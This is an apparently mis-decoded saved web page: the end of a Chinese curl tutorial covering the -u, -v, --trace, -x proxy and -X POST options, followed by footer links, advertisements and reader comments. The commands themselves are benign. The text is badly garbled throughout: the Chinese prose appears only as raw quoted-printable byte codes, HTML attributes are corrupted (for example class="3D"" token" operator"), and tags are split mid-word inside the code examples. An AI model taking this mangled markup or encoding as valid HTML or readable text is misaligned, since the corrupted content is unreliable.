=E4=BE=8B=E5=AD=90=E9=87=8C=E9=9D=A2=E7=9A=84 HTTP =E6=A0=87=E5=A4=B4=E3=80=
=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>u <span class="3D"token" string=">'bob'</span> https<span class=3D" token punctuation">:</span><span class="=3D"token" operator">/</span><span class="3D"token" operator">/</span>google<s= pan class="3D"token" punctuation">.com<span class="3D"token" operator">/=
</span>login
</s=></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E5=8F=AA=E8=AE=BE=E7=BD=AE=E4=BA=86=
=E7=94=A8=E6=88=B7=E5=90=8D=EF=BC=8C=E6=89=A7=E8=A1=8C=E5=90=8E=EF=BC=8Ccur=
l =E4=BC=9A=E6=8F=90=E7=A4=BA=E7=94=A8=E6=88=B7=E8=BE=93=E5=85=A5=E5=AF=86=
=E7=A0=81=E3=80=82</p>

<h2><strong>-v</strong></h2>

<p><code>-v</code>=E5=8F=82=E6=95=B0=E8=BE=93=E5=87=BA=E9=80=9A=E4=BF=A1=E7=
=9A=84=E6=95=B4=E4=B8=AA=E8=BF=87=E7=A8=8B=EF=BC=8C=E7=94=A8=E4=BA=8E=E8=B0=
=83=E8=AF=95=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>v https<span class="3D"token" p="unctuation"">:</span><span class="3D"token" operator">/</span><span class="3D"t=" oken operator">/</span>www<span class="3D"token" punctuation">.</span>example=
<span class="3D"token" punctuation">.</span>com
</code></pre></blockquote>

<p><code>--trace</code>=E5=8F=82=E6=95=B0=E4=B9=9F=E5=8F=AF=E4=BB=A5=E7=94=
=A8=E4=BA=8E=E8=B0=83=E8=AF=95=EF=BC=8C=E8=BF=98=E4=BC=9A=E8=BE=93=E5=87=BA=
=E5=8E=9F=E5=A7=8B=E7=9A=84=E4=BA=8C=E8=BF=9B=E5=88=B6=E6=95=B0=E6=8D=AE=E3=
=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">--</span>trace <span class="3D"token" o="perator"">-</span> https<span class="3D"token" punctuation">:</span><span clas="s=3D"token" operator">/</span><span class="3D"token" operator">/</span>www<spa= n class="3D"token" punctuation">.example<span class="3D"token" punctuati="on"">.</span>com
</spa=></code></pre></blockquote>

<h2><strong>-x</strong></h2>

<p><code>-x</code>=E5=8F=82=E6=95=B0=E6=8C=87=E5=AE=9A HTTP =E8=AF=B7=E6=B1=
=82=E7=9A=84=E4=BB=A3=E7=90=86=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>x socks5<span class="3D"token" = punctuation">:</span><span class="3D"token" operator">/</span><span class="3D"=" token operator">/</span>james<span class="3D"token" punctuation">:</span><a c="lass=3D"token" email-link" href="3D"mailto:cats@myproxy"">cats@myproxy</a><spa= n class="3D"token" punctuation">.com<span class="3D"token" punctuation">=
:</span><span class="3D"token" number">8080</span> https<span class="3D"token" = punctuation">:</span><span class="3D"token" operator">/</span><span class="3D"=" token operator">/</span>www<span class="3D"token" punctuation">.</span>exampl=
e<span class="3D"token" punctuation">.</span>com
</spa=></code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E6=8C=87=E5=AE=9A HTTP =E8=AF=B7=E6=
=B1=82=E9=80=9A=E8=BF=87<code>myproxy.com:8080</code>=E7=9A=84 socks5 =E4=
=BB=A3=E7=90=86=E5=8F=91=E5=87=BA=E3=80=82</p>

<p>=E5=A6=82=E6=9E=9C=E6=B2=A1=E6=9C=89=E6=8C=87=E5=AE=9A=E4=BB=A3=E7=90=86=
=E5=8D=8F=E8=AE=AE=EF=BC=8C=E9=BB=98=E8=AE=A4=E4=B8=BA HTTP=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>x james<span class="3D"token" p="unctuation"">:</span><a class="3D"token" email-link" href="3D"mailto:cats@mypro=" xy">cats@myproxy</a><span class="3D"token" punctuation">.</span>com<span clas="s=3D"token" punctuation">:</span><span class="3D"token" number">8080</span> ht=
tps<span class="3D"token" punctuation">:</span><span class="3D"token" operator">/</span><span class="3D"token" operator">/</span>www<span class="3D"token" pun="ctuation"">.</span>example<span class="3D"token" punctuation">.</span>com
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E4=B8=AD=EF=BC=8C=E8=AF=B7=E6=B1=82=
=E7=9A=84=E4=BB=A3=E7=90=86=E4=BD=BF=E7=94=A8 HTTP =E5=8D=8F=E8=AE=AE=E3=80=
=82</p>

<h2><strong>-X</strong></h2>

<p><code>-X</code>=E5=8F=82=E6=95=B0=E6=8C=87=E5=AE=9A HTTP =E8=AF=B7=E6=B1=
=82=E7=9A=84=E6=96=B9=E6=B3=95=E3=80=82</p>

<blockquote><pre class="3D"" language-bash"><code class="3D"" language-bash">
$ curl <span class="3D"token" operator">-</span>X POST https<span class="3D"to=" ken punctuation">:</span><span class="3D"token" operator">/</span><span class="=3D"token" operator">/</span>www<span class="3D"token" punctuation">.</span>ex=
ample<span class="3D"token" punctuation">.</span>com
</code></pre></blockquote>

<p>=E4=B8=8A=E9=9D=A2=E5=91=BD=E4=BB=A4=E5=AF=B9<code>https://www.example.c=
om</code>=E5=8F=91=E5=87=BA POST =E8=AF=B7=E6=B1=82=E3=80=82</p>

<h2>=E5=8F=82=E8=80=83=E9=93=BE=E6=8E=A5</h2>

<ul>
<li><a href="3D"https://catonmat.net/cookbooks/curl"" target="3D"_blank"">Curl =
Cookbook</a></li>
</ul>

<p>=EF=BC=88=E5=AE=8C=EF=BC=89</p>

                                    <!-- /div -->

                                </=></p></div>
   =20
                                <div class="3D"asset-footer"">

<h3>=E6=96=87=E6=A1=A3=E4=BF=A1=E6=81=AF</h3>
<ul>
<li>=E7=89=88=E6=9D=83=E5=A3=B0=E6=98=8E=EF=BC=9A=E8=87=AA=E7=94=B1=E8=BD=
=AC=E8=BD=BD-=E9=9D=9E=E5=95=86=E7=94=A8-=E9=9D=9E=E8=A1=8D=E7=94=9F-=E4=BF=
=9D=E6=8C=81=E7=BD=B2=E5=90=8D=EF=BC=88<a href="3D"http://creativecommons.or=" g licenses by-nc-nd 3.0 deed.zh">=E5=88=9B=E6=84=8F=E5=85=B1=E4=BA=AB3.0=E8=
=AE=B8=E5=8F=AF=E8=AF=81</a>=EF=BC=89</li>
<li>=E5=8F=91=E8=A1=A8=E6=97=A5=E6=9C=9F=EF=BC=9A <abbr class="3D"published"=" title="3D"2019-09-05T10:45:21+08:00"">2019=E5=B9=B49=E6=9C=88 5=E6=97=A5</abbr></li>

</ul>
                                </div>
</article>
                            </div>

  <div style="3D"display:" inline-block ! important;width: 100%;">
  <p style="3D"text-align:center;font-size:" 16px;">
    <a title="3D"=E6=9E=81=E5=AE=A2=E5=A4=A7=E5=AD=A6"" target="3D"_blank"" hre="f=3D"https://u.geekbang.org/subject/fe/1000447?utm_source=3Druanyf&amp;utm_=" medium="3Dad0519&amp;utm_term=3Druanyfad0519&amp;gk_cus_user_wechat=3Duniver=" sity">winter =E8=80=81=E5=B8=88=E7=9A=84=E5=89=8D=E7=AB=AF=E8=AE=AD=E7=BB=
=83=E8=90=A5</a>
    <br>
    <a title="3D"=E6=9E=81=E5=AE=A2=E5=A4=A7=E5=AD=A6"" href="3D"https://u.gee=" kbang.org subject fe 1000447?utm_source="3Druanyf&amp;utm_medium=3Dad0519&am=" p;utm_term="3Druanyfad0519&amp;gk_cus_user_wechat=3Duniversity"" target="3D"_b=" lank"><img 202005 alt="3D"=E6=9E=81=E5=AE=A2=E5=A4=A7=E5=AD=A6"" src="3D"https://www.=" wangbase.com blogimg asset bg2020051901.jpg" style="3D"border:" 1px so="lid" #666;display: block !important;width:100%;max-width:100%;"></a>
  </p>
  </div>

<div id="3D"related_entries"">
<h2>=E7=9B=B8=E5=85=B3=E6=96=87=E7=AB=A0</h2>
<ul>

<li><strong>2020.04.27: <a href="3D"http://www.ruanyifeng.com/blog/2020/04/g=" it-cherry-pick.html">git cherry-pick =E6=95=99=E7=A8=8B</a></strong>

                           <div class="3D"entry-body"">
                              =E5=AF=B9=E4=BA=8E=E5=A4=9A=E5=88=86=E6=94=AF=
=E7=9A=84=E4=BB=A3=E7=A0=81=E5=BA=93=EF=BC=8C=E5=B0=86=E4=BB=A3=E7=A0=81=E4=
=BB=8E=E4=B8=80=E4=B8=AA=E5=88=86=E6=94=AF=E8=BD=AC=E7=A7=BB=E5=88=B0=E5=8F=
=A6=E4=B8=80=E4=B8=AA=E5=88=86=E6=94=AF=E6=98=AF=E5=B8=B8=E8=A7=81=E9=9C=80=
=E6=B1=82=E3=80=82

                           </div>

</li>

=20
<li><strong>2020.04.16: <a href="3D"http://www.ruanyifeng.com/blog/2020/04/b=" ash-tutorial.html">=E3=80=8ABash =E8=84=9A=E6=9C=AC=E6=95=99=E7=A8=8B=E3=80=
=8B=E5=8F=91=E5=B8=83=E4=BA=86</a></strong>

                           <div class="3D"entry-body"">
                              =E8=BF=87=E5=8E=BB=E4=B8=89=E4=B8=AA=E6=9C=88=
=EF=BC=8C=E6=88=91=E4=B8=80=E7=9B=B4=E5=9C=A8=E5=86=99=E3=80=8ABash =E8=84=
=9A=E6=9C=AC=E6=95=99=E7=A8=8B=E3=80=8B=EF=BC=8C=E7=8E=B0=E5=9C=A8=E7=BB=88=
=E4=BA=8E=E5=86=99=E5=AE=8C=E4=BA=86=E3=80=82

                           </div>

</li>

=20
<li><strong>2020.02.23: <a href="3D"http://www.ruanyifeng.com/blog/2020/02/s=" parql.html">RDF =E5=92=8C SPARQL =E5=88=9D=E6=8E=A2=EF=BC=9A=E4=BB=A5=E7=BB=
=B4=E5=9F=BA=E6=95=B0=E6=8D=AE=E4=B8=BA=E4=BE=8B</a></strong>

                           <div class="3D"entry-body"">
                              =E7=BB=B4=E5=9F=BA=E7=99=BE=E7=A7=91=E6=9C=89=
=E4=B8=80=E4=B8=AA=E5=A7=90=E5=A6=B9=E9=A1=B9=E7=9B=AE=EF=BC=8C=E5=8F=AB=E5=
=81=9A"=E7=BB=B4=E5=9F=BA=E6=95=B0=E6=8D=AE"=EF=BC=88Wikidata=EF=BC=89=E3=
=80=82=E4=BD=A0=E5=8F=AF=E4=BB=A5=E4=BB=8E=E7=BB=B4=E5=9F=BA=E7=99=BE=E7=A7=
=91=E5=B7=A6=E4=BE=A7=E8=BE=B9=E6=A0=8F=E7=82=B9=E8=BF=9B=E5=8E=BB=E3=80=82

                           </div>

</li>

=20
<li><strong>2020.01.14: <a href="3D"http://www.ruanyifeng.com/blog/2020/01/f=" fmpeg.html">FFmpeg =E8=A7=86=E9=A2=91=E5=A4=84=E7=90=86=E5=85=A5=E9=97=A8=
=E6=95=99=E7=A8=8B</a></strong>

                           <div class="3D"entry-body"">
                              FFmpeg =E6=98=AF=E8=A7=86=E9=A2=91=E5=A4=84=
=E7=90=86=E6=9C=80=E5=B8=B8=E7=94=A8=E7=9A=84=E5=BC=80=E6=BA=90=E8=BD=AF=E4=
=BB=B6=E3=80=82

                           </div>

</li>

=20
</ul>
</div>


<div id="3D"cre"" style="3D"display:" block !important;">
<h2>=E5=B9=BF=E5=91=8A<a href="3D"http://www.ruanyifeng.com/support.html"">=
=EF=BC=88=E8=B4=AD=E4=B9=B0=E5=B9=BF=E5=91=8A=E4=BD=8D=EF=BC=89</a></h2>
<div id="3D"cre-inner"">

<p style="3D"font-size:16px;text-align:center;""><a title="3D"Vue" =e6="BA=90=E7=" =a0="81=E5=89=96=E6=9E=90=E8=AF=BE=E7=A8=8B"" href="3D"https://datayi.cn/w/xog=" jqgop" target="3D"_blank"">Vue =E6=BA=90=E7=A0=81=E5=89=96=E6=9E=90=E8=AF=BE=
=E7=A8=8B</a></p>
<a title="3D"Vue" =e6="BA=90=E7=A0=81=E5=89=96=E6=9E=90=E8=AF=BE=E7=A8=8B"" hre="f=3D"https://datayi.cn/w/xogjqgOP"" target="3D"_blank""><img 202005 alt="3D"=3D&quot;V=" ue"="E6=BA=90=E7=A0=81=E5=89=96=E6=9E=90=E8=AF=BE=E7=A8=8B"=3D""" src="/2020/05/26/Http%E5%8D%8F%E8%AE%AE%E7%9C%9F%E9%A2%98/curl%20%E7%9A%84%E7%94%A8%E6%B3%95%E6%8C%87%E5%8D%97%20-%20%E9%98%AE%E4%B8%80%E5%B3%B0%E7%9A%84%E7%BD%91%E7%BB%9C%E6%97%A5%E5%BF%97/3D"htt=" ps: www.wangbase.com blogimg asset bg2020052207.jpg" style="3D"borde=" r:none;"></a>



</div>
</div>








                   =20

                    <div id="3D"comments"" class="3D"comments"">


   =20
   =20
       =20
    <h2 class="3D"comments-header"">=E7=95=99=E8=A8=80=EF=BC=8812=E6=9D=A1=EF=
=BC=89</h2>

    <div id="3D"comments-content"" class="3D"comments-content"" style="3D"clear:=" left;">
       =20
        <div id="3D"comment-413232"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author">Rouzip</span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-413232"">
            <p>-S =E4=BB=A3=E7=A0=81=E4=B8=AD=E6=89=93=E6=88=90=E4=BA=86s=
=EF=BC=8C=E5=90=8C=E6=97=B6=E5=BA=94=E8=AF=A5=E5=92=8C-o=E9=85=8D=E5=90=88=
=E5=90=A7=EF=BC=9F</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 10=":57" 2019 class="3D"published"" title="3D"September" 5, am">2019=E5=B9=B49=E6=9C=88 5=E6=97=A5 10:57</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-413232">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8Rouzip=E7=9A=84=E8=BF=99=E6=9D=A1=E7=" =95="99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
   =20
       =20
        <div id="3D"comment-413246"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author"><a title="3D"http://muxueqz=" .top" href="3D"http://muxueqz.top/"" target="3D"_blank"" rel="3D"nofollow"">muxue=
qz</a></span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-413246"">
            <p>=E7=86=9F=E6=82=89CLI=E4=B9=8B=E5=90=8Ecurl=E6=98=AF=E7=9C=
=9F=E7=9A=84=E8=9B=AE=E5=A5=BD=E7=94=A8=E7=9A=84=EF=BC=8C=E8=80=8C=E4=B8=94=
FireFox/Chrome=E7=9A=84Dev Tools=E5=8F=AF=E4=BB=A5=E7=9B=B4=E6=8E=A5=E6=8A=
=8A=E8=AF=B7=E6=B1=82=E5=A4=8D=E5=88=B6=E6=88=90curl=E7=9A=84=E5=91=BD=E4=
=BB=A4=EF=BC=8C=E7=84=B6=E5=90=8E=E5=8F=AF=E4=BB=A5=E7=9B=B4=E6=8E=A5=E5=9C=
=A8shell=E9=87=8C=E8=BF=90=E8=A1=8C</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 7=":53" 2019 class="3D"published"" title="3D"September" 5, pm">2019=E5=B9=B49=E6=9C=88 5=E6=97=A5 19:53</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-413246">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8muxueqz=E7=9A=84=E8=BF=99=E6=9D=A1=" =e7="95=99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
   =20
       =20
        <div id="3D"comment-413247"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author"><a title="3D"http://www.84z=" hu.com" href="3D"http://www.84zhu.com/"" target="3D"_blank"" rel="3D"nofollow"">=
=E8=83=BD=E5=8F=94</a></span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-413247"">
            <p>=E9=98=AE=E8=80=81=E5=A4=A7=E6=98=AF=E4=B8=8D=E6=98=AF=E6=B2=
=A1=E4=B8=9C=E8=A5=BF=E5=86=99=E4=BA=86=E5=93=88</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 9=":58" 2019 class="3D"published"" title="3D"September" 5, pm">2019=E5=B9=B49=E6=9C=88 5=E6=97=A5 21:58</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-413247">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8=E8=83=BD=E5=8F=94=E7=9A=84=E8=BF=99=" =e6="9D=A1=E7=95=99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
   =20
       =20
        <div id="3D"comment-413252"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author"><a title="3D"https://haha.p=" lus" href="3D"https://haha.plus/"" target="3D"_blank"" rel="3D"nofollow"">=E9=B2=
=81=E7=8F=AD=E4=B8=83=E5=8F=B7</a></span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-413252"">
            <p>=E7=99=BE=E5=BA=A6=E6=8F=90=E4=BA=A4=E9=93=BE=E6=8E=A5=E6=AF=
=8F=E6=AC=A1=E9=83=BD=E7=94=A8=E5=88=B0curl</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 9=":17" 2019 class="3D"published"" title="3D"September" 6, am">2019=E5=B9=B49=E6=9C=88 6=E6=97=A5 09:17</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-413252">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8=E9=B2=81=E7=8F=AD=E4=B8=83=E5=8F=B7=" =e7="9A=84=E8=BF=99=E6=9D=A1=E7=95=99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
   =20
       =20
        <div id="3D"comment-413257"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author">typebrook</span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-413257"">
            <p>=E6=84=9F=E8=AC=9D=E9=98=AE=E8=80=81=E5=B8=AB=E5=B0=8D=E5=B8=
=B8=E7=94=A8=E6=8C=87=E4=BB=A4=E7=9A=84=E4=BB=8B=E7=B4=B9=EF=BC=81<br>
xargs=E5=92=8Cawk=E9=82=A3=E5=85=A9=E7=AF=87=E6=88=91=E5=B8=B8=E5=B8=B8=E5=
=9B=9E=E9=A0=AD=E7=BF=BB=E9=96=B1</p>

<p>=E5=8F=A6=E5=A4=96</p>

<p>```<br>
$ curl -head <a href="3D"https://www.example.com/"" rel="3D"nofollow"">https://=
www.example.com</a><br>
```<br>
=E5=B0=91=E4=BA=86=E4=B8=80=E5=80=8B`-`</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 9=":55" 2019 class="3D"published"" title="3D"September" 6, am">2019=E5=B9=B49=E6=9C=88 6=E6=97=A5 09:55</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-413257">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8typebrook=E7=9A=84=E8=BF=99=E6=9D=A1=" =e7="95=99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
   =20
       =20
        <div id="3D"comment-413303"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author">note</span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-413303"">
            <p>=E8=A1=A5=E4=B8=80=E4=B8=AA=E6=88=91=E7=BB=8F=E5=B8=B8=E7=94=
=A8=E7=9A=84=E5=8F=82=E6=95=B0=EF=BC=9A<br>
-R, --remote-time   Set the remote file's time on the local output</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 6=":09" 2019 class="3D"published"" title="3D"September" 6, pm">2019=E5=B9=B49=E6=9C=88 6=E6=97=A5 18:09</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-413303">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8note=E7=9A=84=E8=BF=99=E6=9D=A1=E7=" =95="99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
   =20
       =20
        <div id="3D"comment-413653"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author"><a title="3D"http://=E6=97=" =a0" href="3D"http://xn--rgv/"" target="3D"_blank"" rel="3D"nofollow"">Heng Wei</a></span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-413653"">
            <p>=E5=BE=88=E6=A3=92=EF=BC=8C=E5=8F=97=E6=95=99=E4=BA=86=EF=BC=
=8C=E5=A4=9A=E8=B0=A2</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 2=":30" 2019 class="3D"published"" title="3D"September" 23, pm">2019=E5=B9=B49=E6=9C=8823=E6=97=A5 14:30</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-413653">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8Heng" wei="E7=9A=84=E8=BF=99=E6=9D=A1=" =e7="95=99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
   =20
       =20
        <div id="3D"comment-413660"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author"><a title="3D"http://=E6=97=" =a0" href="3D"http://xn--rgv/"" target="3D"_blank"" rel="3D"nofollow"">Tian w</a>=
</span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-413660"">
            <p>curl=E6=98=AF=E7=9C=9F=E7=9A=84=E8=9B=AE=E5=A5=BD=E7=94=A8=
=E7=9A=84</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 4=":15" 2019 class="3D"published"" title="3D"September" 23, pm">2019=E5=B9=B49=E6=9C=8823=E6=97=A5 16:15</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-413660">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8Tian" w="E7=9A=84=E8=BF=99=E6=9D=A1=E7=" =95="99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
   =20
       =20
        <div id="3D"comment-415197"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author">linfeng</span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-415197"">
            <p>=E6=88=91=E4=B9=9F=E8=B4=A1=E7=8C=AE=E4=B8=80=E4=B8=AA<br>
--resolve HOST:PORT:ADDRESS  =E5=B0=86 HOST:PORT =E5=BC=BA=E5=88=B6=E8=A7=
=A3=E6=9E=90=E5=88=B0 ADDRESS=E3=80=82=E3=80=82</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 2019 class="3D"published"" title="3D"December" 17, 11:="25" pm">2019=E5=B9=B412=E6=9C=8817=E6=97=A5 23:25</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-415197">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8linfeng=E7=9A=84=E8=BF=99=E6=9D=A1=" =e7="95=99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
   =20
       =20
        <div id="3D"comment-415981"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author">=E6=9B=B4=E9=A3=8E</span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-415981"">
            <p>=E6=9C=89=E4=B8=AA=E7=96=91=E9=97=AE=EF=BC=8Cjava =E8=B0=83=
=E7=94=A8 curl -F 'file=3D@/zzz.zip'=E8=AF=B7=E6=B1=82=E5=9C=B0=E5=9D=80=EF=
=BC=8C=E8=AF=BB=E5=8F=96=E8=BF=94=E5=9B=9E=E6=B5=81=E5=AD=97=E8=8A=82=E4=B8=
=BA=E7=A9=BA=EF=BC=8C=E7=9B=B4=E6=8E=A5=E5=88=B0=E6=9C=8D=E5=8A=A1=E5=99=A8=
=E4=B8=8A=E6=89=A7=E8=A1=8C=E5=91=BD=E4=BB=A4=EF=BC=8C=E6=9C=89=E6=AD=A3=E5=
=B8=B8=E6=89=93=E5=8D=B0=EF=BC=8C=E8=BF=99=E6=98=AF=E5=95=A5=E6=83=85=E5=86=
=B5</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 2020 class="3D"published"" title="3D"January" 19, 10:3="5" am">2020=E5=B9=B41=E6=9C=8819=E6=97=A5 10:35</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-415981">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8=E6=9B=B4=E9=A3=8E=E7=9A=84=E8=BF=99=" =e6="9D=A1=E7=95=99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
</div>
       =20
   =20
       =20
        <div id="3D"comment-416115"" class="3D"comment"">
    <div class="3D"inner"">
        <div class="3D"comment-header"">
            <div class="3D"asset-meta"">
<p>
                <span class="3D"byline"">
                   =20

                    <span class="3D"vcard" author">Monica</span>

 =E8=AF=B4=EF=BC=9A
                </span>
</p>
            </div>
        </div>
        <div class="3D"comment-content"" id="3D"comment-quote-416115"">
            <p>=E6=82=A8=E5=A5=BD=EF=BC=81=E8=AF=B7=E9=97=AEcurl=E5=8F=AF=
=E4=BB=A5=E7=94=A8=E4=BA=8E=E4=B8=8A=E4=BC=A0=E4=B8=80=E4=B8=AA=E8=A7=86=E9=
=A2=91=E6=96=87=E4=BB=B6=E5=90=97=EF=BC=9F=E6=80=8E=E6=A0=B7=E5=86=99=E8=BF=
=99=E4=B8=AA=E5=91=BD=E4=BB=A4=EF=BC=9F=E6=84=9F=E8=B0=A2=EF=BC=81=EF=BC=81=
</p>
        </div>
<div class="3D"comment-footer"">
<div class="3D"comment-footer-inner"">
<p>
                   <abbr 2020 class="3D"published"" title="3D"February" 6, 6:="19" pm">2020=E5=B9=B42=E6=9C=88 6=E6=97=A5 18:19</abbr>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-416115">#</a>
 | <a href="3D"http://www.ruanyifeng.com/blog/2019/09/curl-reference.html#co=" mment-text" title="3D"=E5=BC=95=E7=94=A8Monica=E7=9A=84=E8=BF=99=E6=9D=A1=E7=" =95="99=E8=A8=80"">=E5=BC=95=E7=94=A8</a>
</p>
</div>
</div>
    </div>
